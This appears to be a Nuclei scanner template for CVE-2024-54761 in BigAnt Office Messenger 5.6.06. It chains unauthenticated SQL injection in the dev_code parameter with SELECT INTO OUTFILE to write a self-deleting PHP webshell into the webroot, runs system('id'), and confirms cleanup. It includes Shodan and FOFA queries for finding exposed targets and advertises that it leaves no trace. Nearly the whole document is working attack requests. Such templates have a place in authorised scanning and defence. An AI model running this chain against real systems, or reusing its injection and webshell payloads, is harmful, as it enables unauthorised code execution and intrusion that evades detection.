id: cve-2024-54761-chain

info:
  name: BigAnt Office Messenger 5.6.06 - Stealth RCE via SQL Injection (Ephemeral OUTFILE Chain)
  author: 3th1c_yuk1, x-stp
  severity: critical
  description: |
    A critical SQL injection vulnerability in BigAnt Office Messenger 5.6.06 allows remote unauthenticated attackers 
    to execute arbitrary system commands by abusing MySQL's SELECT ... INTO OUTFILE functionality. 
    The attack chain conditionally writes a transient PHP webshell to disk, executes `system('id')`, and 
    immediately self-destructs via unlink(). This leaves no traceable artifact and requires no authentication.

    Exploitation is contingent on MySQL's FILE privilege and a writable webroot directory, commonly observed in 
    default or misconfigured deployments on Windows. This CVE mimics a full killchain, enabling attackers to move 
    from unauthenticated input to precise ephemeral code execution — all in under 3 requests.

    Threat actors may leverage this as an initial foothold vector in targeted intrusions against Windows-based 
    internal collaboration software with elevated service contexts.

  reference:
    - https://github.com/nscan9/CVE-2024-54761-BigAnt-Office-Messenger-5.6.06-RCE-via-SQL-Injection
    - https://nvd.nist.gov/vuln/detail/CVE-2024-54761
  metadata:
    verified: true
    max-request: 5
    vendor: BigAntSoft
    product: Office Messenger
    shodan-query: http.html:"BigAnt Office Messenger"
    fofa-query: body="BigAnt Office"
    exploit-type: RCE
    cwe-id: CWE-89
    attack-surface: remote
    privilege-required: none
    user-interaction: none
    exploit-chain: sql-injection→file-write→rce→self-clean
  tags: cve,cve2024,bigant,sql-injection,rce,webroot,ephemeral,unlink,windows,filewrite,chain,killchain,noauth,critical

variables:
  checkfile: "{{randstr}}.txt"
  shellfile: "{{randstr}}.phtml"
  marker: "BigAntOM-{{randstr}}"
  payload: "<?php echo '{{marker}}'; system('id'); unlink(__FILE__); ?>"

http:
  - id: outfile-check
    raw:
      - |
        GET /index.php/Admin/user/index/clientid/1.html?dev_code=';SELECT+'{{marker}}'+INTO+OUTFILE+'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/{{checkfile}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: status
        status:
          - 200

  - id: verify-checkfile
    method: GET
    path:
      - "{{BaseURL}}/{{checkfile}}"

    matchers:
      - type: word
        part: body
        words:
          - "{{marker}}"

  - id: drop-shell
    raw:
      - |
        GET /index.php/Admin/user/index/clientid/1.html?dev_code=';SELECT+CHAR({{payload | to_char }})+INTO+OUTFILE+'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/{{shellfile}}'-- HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers:
      - type: status
        status:
          - 200

  - id: execute-shell
    raw:
      - |
        GET /{{shellfile}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        condition: and
        part: body
        words:
          - "{{marker}}"
          - "uid="
          - "gid="
          - "groups="

  - id: cleanup-confirmation
    method: GET
    path:
      - "{{BaseURL}}/{{shellfile}}"

    matchers:
      - type: status
        status:
          - 404
